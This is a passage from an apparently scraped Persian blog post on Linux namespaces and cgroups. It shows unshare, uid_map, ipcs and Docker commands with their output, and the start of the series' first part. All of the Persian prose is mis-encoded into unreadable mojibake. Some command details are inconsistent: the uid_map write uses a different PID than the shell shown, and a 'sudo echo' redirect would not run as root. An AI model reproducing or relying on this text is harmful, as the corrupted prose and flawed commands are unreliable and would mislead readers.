ุงุฌุงุฒู ูโุฏูุฏ ูพุฑุฏุงุฒูโ ุฏุงุฎู ฺฉุงูุชูุฑ ฺฉู ูุงุจุณุชู ุจู ฺฉุงุฑุจุฑ root ุงุณุช ุงุฌุฑุง ุดูุฏ ูู ุญุช ุงฺฏุฑ ุจู ูุญู ูพุฑุฏุงุฒูโ ุจุชูุงูุฏ ุงุฒ ูุญุท ุงุฒููู ุฎุงุฑุฌ ุดูุฏ ุณุทุญ ุฏุณุชุฑุณ ุขู ุฏุฑ ูุฒุจุงู ฺฉูโุชุฑ ุงุฒ ฺฉุงุฑุจุฑ root ูโุจุงุดุฏ.\nุจุฑุง ุขุฒูุงุด ุงู ูฺฺฏ ุฏุณุชูุฑุงุช ุฒุฑ ุฑุง ุงุฌุฑุง ูโฺฉูู.\n1 2 3 4 5 $ unshare --user bash nobody@Milad-PC:/tmp$ id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) nobody@Milad-PC:/tmp$ capsh --print | grep Current Current: = ููุงูโุทูุฑ ฺฉู ูโุจูู ุฏุฑ ูุถุงูุงู user ฺฉู ุณุงุฎุชู ฺฉุงุฑุจุฑ ุฏุงุฑุง ุดูุงุณูโ nobody ุงุณุช ู ูููโุทูุฑ ูฺ capability ูุฒ ุจู ุขู ุชุฎุตุต ูุงูุชู ุงุณุช.\nุจุฑุง ุงุฏุงููโ ฺฉุงุฑ ุจู pid ูพุฑุฏุงุฒูโ bash ุฏุฑ ุงู ูุถุงูุงู ูุงุฒ ุฏุงุฑู. ุฏุฑ ุงูุฌุง ุจุงุฏ ฺฉ ูฺฏุงุดุช ุจู ุดูุงุณูโ ฺฉุงุฑุจุฑ ุฏุฑ ุฏุงุฎู ูุถุงูุงู ู ุฏุงุฎู ูุฒุจุงู ุงุฌุงุฏ ฺฉูู. ุงู ูฺฏุงุดุช ุจุงุฏ ุฏุฑ ูุงู proc//uid_map/ ุงุนูุงู ุดูุฏ. ุจุฑุง ุงูฺฉู ุจุฏุงูู ฺู ููุงุฏุฑ ูุงุฑุฏ ุดูุฏ ูุงุฒ ุงุณุช ฺฉู ุณุงุฎุชุงุฑ ุขู ุฑุง ุจุฏุงูู.\n1 2 nobody@Milad-PC:/tmp$ echo $$ 27391 ุชูุถุญ:\n1 2 3 4 5 6 7 $ man user_namespaces ... Each line in the uid_map file specifies a 1-to-1 mapping of a range of contiguous user IDs between two user namespaces. (When a user namespace is first created, this file is empty.) The specification in each line takes the form of three numbers delimited by white space. The first two numbers specify the starting user ID in each of the two user namespaces. The third number speciโ fies the length of the mapped range. ... ุจุง ุชูุฌู ุจู ุชูุถุญุงุช ููุฌูุฏ ุฏุฑ ุฑุงูููุง user_namespaces ุฏุฑ ุงู ูุงู ุจุงุฏ ุณู ููุฏุงุฑ ูุนู ุดูุฏ. ููุฏุงุฑ ุงูู ูุดุฎุต ฺฉููุฏูโ ุดูุงุณูโ ฺฉุงุฑุจุฑ ุฏุฑ ูุถุงูุงู ุงุฌุงุฏ ุดุฏู ูโุจุงุดุฏ. ููุฏุงุฑ ุฏูู ูุดุฎุต ฺฉููุฏูโ ุดูุงุณูโ ฺฉุงุฑุจุฑ ุฏุฑ ูุฒุจุงู ูโุจุงุดุฏ ู ุณููู ููุฏุงุฑ ุชุนุฏุงุฏ ุดูุงุณูโูุง ุจุฑุง ูฺฏุงุดุช ุฑุง ูุดุฎุต ูโฺฉูุฏ. ุจู ุทูุฑ ุฎูุงุตู:\nUID-inside-namespace UID-outside-namespace length\nุจุฑุง ูุซุงู ุงฺฏุฑ ุจุฎูุงูู ฺฉุงุฑุจุฑ milad ุฑุง ุจู ฺฉุงุฑุจุฑ root ุฏุฑ ุฏุงุฎู ูุถุงูุงู ุจุงูุฏ ฺฉูู ุจุงุฏ ุจู ุชุฑุชุจ ููุงุฏุฑ 1000 (ุดูุงุณูโ ฺฉุงุฑุจุฑ milad ุฏุฑ ูุฒุจุงู)ุ 0 (ุดูุงุณูโ ฺฉุงุฑุจุฑ root ุฏุฑ ูุถุงูุงู) ู 1 (ููุท ฺฉ ูฺฏุงุดุช ูโุฎูุงูู ุงูุฌุงู ุจุฏู).\n1 2 3 4 $ id uid=1000(milad) gid=1000(milad) groups=1000(milad),27(sudo),104(input) $ sudo echo \u0026#39;0 1000 1\u0026#39; \u0026gt; /proc/31196/uid_map ูุดุงุจู ููู ูฺฏุงุดุช ุจุฑุง ุดูุงุณูโ ฺฏุฑูู (gid) ูุฒ ุงูุฌุงู ูโุดูุฏ.\n1 $ sudo echo \u0026#39;0 1000 1\u0026#39; \u0026gt; /proc/27391/gid_map ุณูพุณ ูุฌุฏุฏุง ุฏุฑ ุชุฑููุงู ุงุฌุงุฏ ุดุฏู ุฏุฑ ูุถุงูุงู ุฏุณุชูุฑ id ุฑุง ุงุฌุฑุง ูโฺฉูู.\n1 2 3 4 5 6 7 8 nobody@Milad-PC:/tmp$ id uid=0(root) gid=0(root) groups=0(root),65534(nogroup) nobody@Milad-PC:/tmp$ cat /proc/self/uid_map 0 1000 1 nobody@Milad-PC:/tmp$ cat /proc/self/gid_map 0 1000 1 nobody@Milad-PC:/tmp$ capsh --print | grep Current Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep ุจุง ุชูุฌู ุจู ุฎุฑูุฌ ุจุงูุง ูุดุงูุฏู ูโุดูุฏ ฺฉู ฺฉุงุฑุจุฑ ุฏุฑ ุฏุงุฎู ูุถุงูุงู root ุงุณุช ู ุจู capabilityูุง ุฏุณุชุฑุณ ุฏุงุฑุฏ ู ุฏุฑ ุฎุงุฑุฌ ุงุฒ ูุถุงูุงู ููุงู โฺฉุงุฑุจุฑ milad ุจุง ุดูุงุณู ฺฉุงุฑุจุฑ 1000 ูโุจุงุดุฏ.\nูุถุงูุงู ุงุฑุชุจุงุท ุจู ูพุฑุฏุงุฒูโุง(IPC) ุฏุฑ ุณุณุชูโุนุงูู ูููฺฉุณ ุฏู ูพุฑุฏุงุฒูโ ูโุชูุงููุฏ ุงุฒ ุทุฑู ุญุงูุธูโ ูุดุชุฑฺฉ ุง ุตู ูพุงู ูุดุชุฑฺฉ ([mq_open]https://man7.org/linux/man-pages/man3/mq_open.3.html)) ุจุง ฺฉุฏฺฏุฑ ูพุงู ุชุจุงุฏู ฺฉููุฏ. ุจุฑุง ุงูฺฉุงุฑ ุงู ุฏู ูพุฑุฏุงุฒู ุจุงุฏ ุนุถู ฺฉ ูุถุงโูุงู IPC ฺฉุณุงู ุจุงุดูุฏ. ุงุฒ ุทุฑู ุจู ุทูุฑ ูพุดโูุฑุถ ูุง ุงูุชุธุงุฑ ุฏุงุฑู ฺฉู ูพุฑุฏุงุฒูโูุง ููุฌูุฏ ุฏุฑ ฺฉุงูุชูุฑูุง ูุฎุชูู ูุชูุงููุฏ ุจู ุญุงูุธูโ ูุดุชุฑฺฉ ฺฉุฏฺฏุฑ ุฏุณุชุฑุณ ุฏุงุดุชู ุจุงุดูุฏ ุจุฑุง ููู ุจุฑุง ุขูโูุง ูุถุงูุงูโูุง IPC ูุฌุฒุง ุงุฌุงุฏ ูโฺฉูู.\nุจุฑุง ููููู ูโุจูู ฺฉู ุจู ุตูุฑุช ูพุดโูุฑุถ ฺฉุงูุชูุฑูุง ุฏุฑ ุฏุงฺฉุฑ ุฏุงุฑุง ูุถุงูุงู ipc ุงุฎุชุตุงุต ูุณุชูุฏ:\n1 2 3 4 5 $ docker ps --quiet --all | xargs docker inspect --format \u0026#39;{{ .Id }}: IpcMode={{ .HostConfig.IpcMode }}\u0026#39; 037ad3a550a7de78ac9a929159b627e765cf753a314f9f4c7f564127b7ac9ccb: IpcMode=private 8676c058096d7337cd497457da25a596f2cc6f317b01d033b2c53329fc6e2619: IpcMode=private d1704e1cb4f280d5e5afeabb8064526fc09f297183006086354fe443c5359b42: IpcMode=private ุจุฑุง ุขุฒูุงุด ูุถุงูุงู ipc ุงุจุชุฏุง ฺฉ ุญุงูุธูโ ูุดุชุฑฺฉ ุงุฌุงุฏ ูโฺฉูู ุณูพุณ ุจุง ุฏุณุชูุฑ ipcs ููุฑุณุช ipcูุง ููุฌูุฏ ุฑุง ุจุฑุฑุณ ูโฺฉูู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 $ ipcmk -M 1000 Shared memory id: 2044428296 $ ipcs ------ Message Queues -------- key msqid owner perms used-bytes messages ------ Shared Memory Segments -------- key shmid owner perms bytes nattch status 0x00000000 2033451008 milad 600 524288 2 dest ... 0xaac7b1b4 2044428296 milad 644 1000 0 ... 0x00000000 849346606 milad 600 524288 2 dest ------ Semaphore Arrays -------- key semid owner perms nsems 0xe93c17d9 131072 milad 666 1 0xcdbd64db 163841 milad 600 1 ุณูพุณ ุจุง ุงุณุชูุงุฏู ุงุฒ unshare ฺฉ ูุถุงูุงู ipc ุงุฌุงุฏ ูโฺฉูู ู ุจุง ุฏุณุชูุฑ ipcs ููุฑุณุช ipcูุง ุฑุง ุจุฑุฑุณ ูโฺฉูู.\n1 2 3 4 5 6 7 $ sudo unshare --ipc /bin/bash root@Milad-PC:~# ipcs ------ Message Queues -------- key msqid owner perms used-bytes messages ------ Shared Memory Segments -------- key shmid owner perms bytes nattch status ------ Semaphore Arrays -------- key semid owner perms nsems ููุงูโุทูุฑ ฺฉู ูุดุงูุฏู ูโฺฉูู ูพุฑุฏุงุฒูโ ููุฌูุฏ ุฏุฑ ุฏุงุฎู ูุถุงูุงู ุฌุฏุฏ ุจู ููุฑุณุช ipcูุง ููุฌูุฏ ุฏุฑ ูุฒุจุงู ุฏุณุชุฑุณ ูุฏุงุฑุฏ.\nูุถุงูุงู cgroup ุฏุฑ ุณุณุชูโุนุงูู ููุงุจุน ูุงููุฏ ูพุฑุฏุงุฒูุฏู (CPU)ุ ุญุงูุธูโ ุงุตู (RAM)ุ ูพููุงโุจุงูุฏ ุดุจฺฉู ู \u0026hellip; ุจู ุตูุฑุช ูุดุชุฑฺฉ ุจู ูพุฑุฏุงุฒูโูุง ุงุณุชูุงุฏู ูโุดูุฏ. ุฏุฑ ุงู ุดุฑุงุท ฺฉ ูพุฑุฏุงุฒู ูโุชูุงูุฏ ุจู ุตูุฑุช ูุงุนุงุฏูุงูู ุจุฎุด ุฒุงุฏ ุงุฒ ุงู ููุงุจุน ุฑุง ุชุตุฑู ููุงุฏ. ุจุฑุง ูุญุฏูุฏ ฺฉุฑุฏู ูุฒุงู ูุตุฑู ุงู ููุงุจุน ุชูุณุท ูพุฑุฏุงุฒูโูุง ุฏุฑ ุณุณุชูโุนุงูู ูููฺฉุณ ูุงุจูุช ุจู ูุงู control groups ุง ุจู ุงุฎุชุตุงุฑ cgroups ูุฌูุฏ ุฏุงุฑุฏ. ุจุง ุจูุฑูโุจุฑุฏุงุฑ ุงุฒ cgroups ูุฏุฑ ุณุณุชู ูโุชูุงูุฏ ุจู ุตูุฑุช ุฏูู ู ุจููู ุจุฑ ุฑู ุชุฎุตุต ู ูุญุฏูุฏ ฺฉุฑุฏู (Resource limiting)ุ ุงูููุชโุจูุฏ (Prioritization)ุ ูุฏุฑุช (Control) ู ุญุณุงุจุฑุณ (Accounting) ููุงุจุน (ุฒุฑ ุณุณุชูโูุง) ฺฉูุชุฑู ุฏุงุดุชู ุจุงุดุฏ.\nุชูุธูุงุช cgroupูุง ุฏุฑ ูุงูุจ ฺฉ ูุงู ุณุณุชู ูุฌุงุฒ ู ุจู ุตูุฑุช ุณูุณูู ูุฑุงุชุจ ูฺฏูโุฏุงุฑ ูโุดูุฏ. ุงู ุณุงุฎุชุงุฑ ูุดุงุจู ุงุทูุงุน ูพุฑุฏุงุฒูโูุง ุฏุฑ ูุณุฑ proc/ ูโุจุงุดุฏ. ุฏุฑ ุงู ุณุงุฎุชุงุฑ ุณูุณููโ ูุฑุงุชุจ ูโุชูุงู cgroupโูุง ูุชุนุฏุฏ ุชุนุฑู ฺฉุฑุฏ ฺฉู ูุฑ ฺฉุฏุงู ุงุฒ ุขูโูุง ูโุชูุงูุฏ ุงุทูุงุนุงุช ุฑุง ุงุฒ ูพุฏุฑุด ุจู ุงุฑุซ ุจุจุฑุฏ. ูููโุทูุฑ ูุฑ ฺฉุฏุงู ุงุฒ cgroupูุง ูโุชูุงูุฏ ุจุฑุง ูุญุฏูุฏ ฺฉุฑุฏู ฺฉ ุง ฺูุฏ ููุงุจุน (RAM, CPU, \u0026hellip;) ุชุนุฑู ุดุฏู ุจุงุดูุฏ.\nุฏุฑ ูููฺฉุณ ฑฒ ููุน ฺฉูุชุฑูุฑ (ุฒุฑุณุณุชู) ุจุฑุง cgroup ูุฌูุฏ ุฏุงุฑุฏ ฺฉู ุฌุฒุฆุงุช ุฏูู ุขูโูุง ุฑุง ูโุชูุงูุฏ ุฏุฑ ุงูุฌุง ูุทุงูุนู ฺฉูุฏ. ุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ูโุชูุงูุฏ ููุฑุณุช ุขูโูุง ุฑุง ูุดุงูุฏู ฺฉูุฏ:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ cat /proc/cgroups #subsys_name\thierarchy\tnum_cgroups\tenabled cpuset\t9\t2\t1 cpu\t10\t94\t1 cpuacct\t10\t94\t1 blkio\t3\t94\t1 memory\t4\t132\t1 devices\t12\t95\t1 freezer\t5\t2\t1 net_cls\t8\t2\t1 perf_event\t7\t2\t1 net_prio\t8\t2\t1 hugetlb\t11\t2\t1 pids\t2\t102\t1 rdma\t6\t1\t1 ููุช ุดูุง ุงุฒ ฺฉ ุชฺฉููููฺ ฺฉุงูุชูุฑ ุงุณุชูุงุฏู ูโฺฉูุฏ ุจู ุตูุฑุช ุฎูุฏฺฉุงุฑ ุนููุงุช ูุงุฒู ู ูุฑุชุจุท ุจุง ุชูุธูุงุช ุดูุง ุงุฌุฑุง ุฎูุงูุฏ ุดุฏ. ุจุฑุง ูุซุงู ุฏุฑ ุฏุงฺฉุฑ ุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ฺฉ ฺฉุงูุชูุฑ ุงุฌุงุฏ ฺฉูุฏ:\n1 $ docker run -d --cpus=\u0026amp;quot1.0\u0026amp;quot --memory=\u0026amp;quot1g\u0026amp;quot hub.hamdocker.ir/library/alpine sleep 6000 bdd23fa5e49a88476f711a75e55a4ad5bd0d52fb3469a4c9d75b3f1e40a84cd1 ุณูพุณ ุจุง ุงุณุชูุงุฏู ุงุฒ ุดูุงุณูโ (ID) ฺฉุงูุชูุฑ ุงุฌุงุฏ ุดุฏู ุฏุฑ ุฏุงุฎู ูุณุฑ ูุฑุจูุท ุจู cgroupูุง ุฏุฑ ุฏุงุฎู ุณุณุชู ูุฒุจุงู ุดูุงุณูโ ูพุฑุฏุงุฒูโโูุง ูุฑุจูุท ุจู ุงู cgroup ุฑุง ูุดุงูุฏู ูโฺฉูู. ููุฏุงุฑ pid ุฏุฑุฌ ุดุฏู ุฏุฑ ุงู ูุงู ูุฑุจูุท ุจู ูพุฑุฏุงุฒูโ sleep ุงุฌุฑุง ุดุฏู ุฏุฑ ุฏุงุฎู ฺฉุงูุชูุฑ ุงุณุช.\n1 2 $ cat /sys/fs/cgroup/devices/docker/bdd23fa5e49a88476f711a75e55a4ad5bd0d52fb3469a4c9d75b3f1e40a84cd1/tasks 29881 ุจุง ุจุฑุฑุณ ูพุฑุฏุงุฒูโูุง ุงุฒ ุทุฑู ุณุณุชู ูุฒุจุงู ุตุญุช ุงู ููุถูุน ุฑุง ุจุฑุฑุณ ูโฺฉูู.\n1 2 3 $ ps -eaf | grep 29881 root 29881 29849 0 02:07 ? 00:00:00 sleep 6000 milad 29954 7914 0 02:08 pts/1 00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn 29881 ูุถุงูุงู cgroup ุจุฑุง ุฌููฺฏุฑ ุงุฒ ุฏุณุชุฑุณ ูพุฑุฏุงุฒูโูุง ุจู ุชูุธูุงุช cgroup ฺฉุฏฺฏุฑ ูโุจุงุดุฏ. ูุฑ ูพุฑุฏุงุฒู ุฏุฑ ูุถุงูุงู cgroup ูุณุฑ ุฑุดูโ ูุฎุชุต ุจู ุฎูุฏ ุฑุง ุฎูุงูุฏ ุฏุงุดุช. ุงู ุฌุฏุงุณุงุฒ ูู ุงุฒ ููุธุฑ ุงููุช ุฌูุช ุฌููฺฏุฑ ุงุฒ ูุดุช ุงุทูุงุนุงุช ูุฒุจุงู ู ูู ุงุฒ ููุธุฑ ุตุญุช ุนููฺฉุฑุฏ ุจู ุฏูู ูุฌูุฏ ูุงุจูุช ุงุฑุซโุจุฑ ู ุนุฏู ุชุตุงุฏู ูุงูโูุง ููู ุงุณุช.\nุจุฑุง ุจุฑุฑุณ ูุงุจูุช ูุถุงูุงู cgroupุ ฺฉ ูุถุงูุงู ุงุฒ ุงู ููุน ุงุฌุงุฏ ูโฺฉูู ุณูพุณ ูุญุชูุงุช ูุงู /proc/self/cgroup ุฑุง ุฏุฑ ุฏุงุฎู ูุถุงูุงู ู ุฏุงุฎู ูุงุดู ูุฒุจุงู ุจุฑุฑุณ ูโฺฉูู.\nุฏุฑ ุฏุงุฎู ูุฒุจุงู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 $ cat /proc/self/cgroup 12:devices:/user.slice 11:hugetlb:/ 10:cpu,cpuacct:/user.slice 9:cpuset:/ 8:net_cls,net_prio:/ 7:perf_event:/ 6:rdma:/ 5:freezer:/ 4:memory:/user.slice 3:blkio:/user.slice 2:pids:/user.slice/user-1000.slice/session-2.scope 1:name=systemd:/user.slice/user-1000.slice/session-2.scope0::/user.slice/user-1000.slice/session-2.scope ุฏุฑ ุฏุงุฎู ูุถุงูุงู:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ sudo unshare --cgroup /bin/bash root@Milad-PC:/proc/7914# cat /proc/self/cgroup 12:devices:/ 11:hugetlb:/ 10:cpu,cpuacct:/ 9:cpuset:/ 8:net_cls,net_prio:/ 7:perf_event:/ 6:rdma:/ 5:freezer:/ 4:memory:/ 3:blkio:/ 2:pids:/ 1:name=systemd:/ 0::/ ููุงูโุทูุฑ ฺฉู ูุดุงูุฏู ูโฺฉูู ูุญุชูุงุช ุงู ุฏู ูุงู ูุชูุงูุช ุงุณุช.\nูุถุงูุงู time ฺฉ ุฏฺฏุฑ ุงุฒ ูุถุงูุงูโูุง ุฏุฑ ูููฺฉุณ ฺฉู ุงุฎุฑุง ุฏุฑ ฺฉุฑูู ูุณุฎูโ ต.ถ ุงุถุงูู ุดุฏู ุงุณุช ูุถุงูุงู ุฒูุงู ุง time ุงุณุช. ุจุง ุงุณุชูุงุฏู ุงุฒ ุงู ูุถุงูุงู ูพุฑุฏุงุฒูโูุง ูโุชูุงููุฏ ููุงุฏุฑ ุฏูุฎูุงู ุจุฑุง CLOCK_MONOTONIC ู CLOCK_BOOTTIME ุฏุงุดุชู ุจุงุดุฏ. ุจูุงุจุฑุงู ุฒูุงู ุฌุงุฑ ู ููุฏุงุฑ uptime ูุฒุจุงู ูโุชูุงูุฏ ุจุง ูพุฑุฏุงุฒูโ ุฏุงุฎู ุงู ูุถุงูุงู ูุชูุงูุช ุจุงุดุฏ. ุฏุงฺฉุฑ ู ุชฺฉููููฺโูุง ูุดุงุจู ุขู ูุนูุง ุงุฒ ุงู ูฺฺฏ ุฏุฑ ุฒูุงู ุงุฌุงุฏ ฺฉุงูุชูุฑ ุงุณุชูุงุฏู ููโฺฉููุฏ.\nุจุฑุง ูุซุงู ุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ูโุชูุงูุฏ ฺฉ ฺฉุงูุชูุฑ ุงุฌุงุฏ ฺฉูุฏ ู ููุฏุงุฑ uptime ุฑุง ุฏุฑ ุฏุงุฎู ฺฉุงูุชูุฑ ู ูุฒุจุงู ููุงุณู ฺฉูุฏ.\nุฏุฑ ุฏุงุฎู ฺฉุงูุชูุฑ:\n1 2 3 $ docker run --rm -it hub.hamdocker.ir/library/alpine sh / # uptime 23:03:49 up 1 day, 13:16, load average: 1.11, 0.74, 0.63 ุฏุฑ ุฏุงุฎู ูุฒุจุงู:\n1 2 $ uptime 02:34:01 up 1 day, 13:17, 4 users, load average: 1.02, 0.74, 0.64 ุงู ุชูุงูุช ุณุงุนุช ุฏุฑ ุฏุงุฎู ฺฉุงูุชูุฑ ู ูุฒุจุงู ุจู ุนูุช ุชูุงูุช timezone ูโุจุงุดุฏ.\nุฌูุนโุจูุฏ ุจุนุฏ ุงุฒ ุขุดูุง ุจุง ูุถุงูุงูโูุง ุฏุฑ ูููฺฉุณ ู cgroups ุญุงูุง ุฏุฑฺฉ ุฏุฑุณุชโุชุฑ ุงุฒ ฺฉุงูุชูุฑโูุง ุง ฺฉุงูุชูุฑ ฺฉุฑุฏู ฺฉ ูพุฑุฏุงุฒู ุฏุงุฑู. ุงูุงู ูโุฏุงูู ฺฉู ุฏุฑ ุฏุงุฎู ฺฉ ฺฉุงูุชูุฑ ฺฉ ูพุฑุฏุงุฒูโ ุฏุฑ ุญุงู ุงุฌุฑุง ุงุณุช ฺฉู ุชูุณุท ูุถุงูุงูโูุง ุงุฒููู ุดุฏู ู ุขุณุชุงููโ ูุตุฑู ููุงุจุน ุขูโูุง ุชูุณุท ูุงุจูุช cgroups ูุญุฏูุฏ ุดุฏู ุงุณุช. ุชุตูุฑ ุฒุฑ ุจู ุฎูุจ ูุญููโ ุนููฺฉุฑุฏ ุงู ูฺฺฏโูุง ุฑุง ููุงุด ูโุฏูุฏ.\nุงูุจุชู ุจุงุฏ ุชูุฌู ุฏุงุดุช ฺฉู ูููโ ุงู ูพุฑุฏุงุฒูโูุง ฺฉุงูุชูุฑ ุดุฏู ุจุฑ ุฑู ฺฉ ฺฉุฑูู ูุดุชุฑฺฉ ุงุฌุฑุง ูโุดููุฏ ู ููููู ุงุฒููู ุดุฏู ูุจุณุช ุจู ุงุฌุฑุง ุฏุฑ ฺฉ ูุงุดู ูุฌุงุฒ (virtual machine) ุจู ูุนูุง ูุงูุน ุงูุฌุง ุฑุนุงุช ููโุดูุฏ ฺฉู ูโุชูุงูุฏ ุงุฒ ููุธุฑ ุงููุช ูุฎุงุทุฑุงุช ุฏุงุดุชู ุจุงุดุฏ. ุจุฑุง ูุซุงู ฺฉ ุขุณุจโูพุฐุฑ ุง ุชูุธูุงุช ุบุฑ ุงูู ูโุชูุงูุฏ ููุฌุฑ ุจู ุฎุงุฑุฌ ุดุฏู ุงุฒ ุฏุงุฎู ฺฉุงูุชูุฑ ุดูุฏ ู ุฏุฑ ูุชุฌู ุฏุณุชุฑุณ ุจู ุชูุงู ฺฉุงูุชูุฑูุง ูุฑุงูู ุดูุฏ. ุฏุฑ ููุดุชุงุฑูุง ุขุช ุจู ุจุฑุฑุณ ุงู ููุน ุญููุงุช ูโูพุฑุฏุงุฒู.\n","date":"2021-03-07T13:25:07Z","image":"https://fa.miladbr.uk/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B2/cover_hu_fb82b5ec64c7f4da.png","permalink":"https://fa.miladbr.uk/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B2/","title":"ูุถุงูุงูโูุง ู ุงุฒููู ฺฉุฑุฏู ูพุฑุฏุงุฒูโูุง ุฏุฑ ูููฺฉุณ - ูุณูุช ฒ"},{"content":" ุฏุฑ ุงู ููุดุชุงุฑ ูโุฎูุงูู ฺฺฏููฺฏ ุงุฒููู ฺฉุฑุฏู ฺฉ ูพุฑุฏุงุฒู ุฏุฑ ุณุณุชูโุนุงูู ูููฺฉุณ ุฑุง ุจุฑุฑุณ ฺฉูู. ุงฺฏุฑ ุจุง Docker ฺฉ ฺฉุงูุชูุฑ ุงุฌุงุฏ ฺฉุฑุฏู ุจุงุดุฏุ ุฏุฑ ุฒูุงู ฺฉุงุฑ ุจุง ุขู ุงุญุณุงุณ ฺฉุฑุฏูโุงุฏ ฺฉู ุฏุงุฎู ุขู ูุดุงุจู ูุญุท ฺฉ ูุงุดู ูุฌุงุฒ ุงุณุช. ูุซูุงู ูุชูุฌู ุดุฏูโุงุฏ ฺฉู ุงุฒ ุฏุฏ ฺฉ ูพุฑุฏุงุฒูโ ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ุฏุงุฎู ฺฉุงูุชูุฑุ ููุฑุณุช ูพุฑุฏุงุฒูโูุงุ ุดุจฺฉู ู ูุงูโุณุณุชู ุจุง ูุงุดู ูุฒุจุงู ูุชูุงูุช ุงุณุชุ ููฺูู ูุฒุงู ููุงุจุน ูุงููุฏ RAM ู CPU ุงุฒ ุฏุฏ ูพุฑุฏุงุฒูโูุง ุฏุงุฎู ฺฉุงูุชูุฑ ูุญุฏูุฏุชุฑ ุงุฒ ฺฉู ููุฏุงุฑ ุฏุฑ ุงุฎุชุงุฑ ูุฒุจุงู ูโุจุงุดุฏ.\nุงู ุณุทุญ ุงุฒ ุงุฒูููโฺฉุฑุฏู ุฏุฑ ุณุณุชูโุนุงูู ูููฺฉุณ ุชูุณุท ูฺฺฏโูุง namespace (ูุถุงูุงู)ุ cgroups, pivot_root ู \u0026hellip; ูพุงุฏูโุณุงุฒ ูโุดูุฏ. ุงุฒููู ฺฉุฑุฏู ูพุฑุฏุงุฒูโูุง ููุถูุน ฺฉูุฏ ุฏุฑ ููุฑุฏ ูุญููโ ุนููโฺฉุฑุฏ ฺฉุงูุชูุฑูุง ูโุจุงุดุฏ. ูุถุงโูุงูโูุง ููุงุจุน ุฑุง ุจู ฺฉุงูุชูุฑ ุงุฎุชุตุงุต ูโุฏููุฏ ฺฉู ฺฉุงููุงู ูุณุชูู ุงุฒ ูุฒุจุงู (host) ู ุจููโ ฺฉุงูุชูุฑโูุง ูุฌุงูุฑ ูโุจุงุดุฏ.\nุงู ููุดุชุงุฑ ุฏุฑ ุฏู ูุณูุช ุชูุธู ุดุฏู ุงุณุช ฺฉู ุฏุฑ ุงุฏุงูู ูุณูุช ุงูู ุขู ุฑุง ูโุฎูุงูุฏ. ูุณูุช ุฏูู ุงู ูุทูุจ ุฑุง ูโุชูุงูุฏ ุงุฒ ุงูุฌุง ุฏูุจุงู ฺฉูุฏ.\nูุถุงโูุงูโูุง (namespaces) ุฏุฑ ูููฺฉุณ ูุถุงูุงู ฺฉ ุงุจุฒุงุฑ ุจุฑุง ูุญุฏูุฏ ฺฉุฑุฏู ุฏุฏ ูพุฑุฏุงุฒูโูุง ูุณุจุช ุจู ูุงุดู ูุฒุจุงู ุงุณุช. ุฏุฑ kernel ูููฺฉุณ ูุถุงูุงูโูุง ูุฎุชูู ูุฌูุฏ ุฏุงุฑุฏ ฺฉู ุงุณุชูุงุฏู ุงุฒ ูุฑ ฺฉุฏุงู ุงุฒ ุขูโูุง ุงุฌุงุฒู ูโุฏูุฏ ฺฉ ูพุฑุฏุงุฒู ุฏุฑ ููุงู ูุถุงูุงู (ูุซูุง ุดุจฺฉู) ุฏุฏ ูุฎุชุต ุจู ุฎูุฏ ุฑุง ุฏุงุดุชู ุจุงุดุฏ. ูุซูุงู ุฏู ูพุฑุฏุงุฒูโ ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ูุฒุจุงู ูโุชูุงููุฏ ูุงู ุณุณุชู ูุดุชุฑฺฉ ุฏุงุดุชู ุจุงุดูุฏ ูู ุฏุฏ ุขูโูุง ูุณุจุช ุจู ฺฉุงุฑุช ุดุจฺฉู ู ุชูุธูุงุช ุขู ูุชูุงูุช ุจุงุดุฏ ู ุงุญุณุงุณ ฺฉููุฏ ุฏุฑ ุฏู ุดุจฺฉูโ ูุฌุฒุง ูุฑุงุฑ ุฏุงุฑูุฏ. ุจู ุฎุงุทุฑ ููู ุณุทุญ ุงุฒ ุงุฒููู ฺฉุฑุฏูุ ูุถุงูุงูโูุง ฺฉ ุงุฒ ุงุจุฒุงุฑูุง ฺฉูุฏ ุจุฑุง ฺฉุงูุชูุฑ ฺฉุฑุฏู ุจุฑูุงููโูุง ูุณุชูุฏ.\nูุถุงูุงูโูุง ููุฌูุฏ ุฏุฑ ูููฺฉุณ Unix Time Sharing (uts) Process ID (pid) Mount (mnt) Network (net) User ID / Group ID (user) Inter-Process Communications (ipc) Control Groups (cgroup) time ุจุฑุง ูุดุงูุฏูู ูุถุงูุงูโูุง ููุฌูุฏ ุฏุฑ ุณุณุชูโุนุงูู ูโุชูุงูุฏ ุงุฒ ุฏุณุชูุฑ lsns ุงุณุชูุงุฏู ฺฉูุฏ:\n1 sudo lsns ุฎุฑูุฌ ููููู:\n1 2 3 4 5 6 7 8 9 10 $ sudo lsns NS TYPE NPROCS PID USER COMMAND 4026531835 cgroup 405 1 root /sbin/init splash 4026531836 pid 354 1 root /sbin/init splash 4026531837 user 361 1 root /sbin/init splash 4026531838 uts 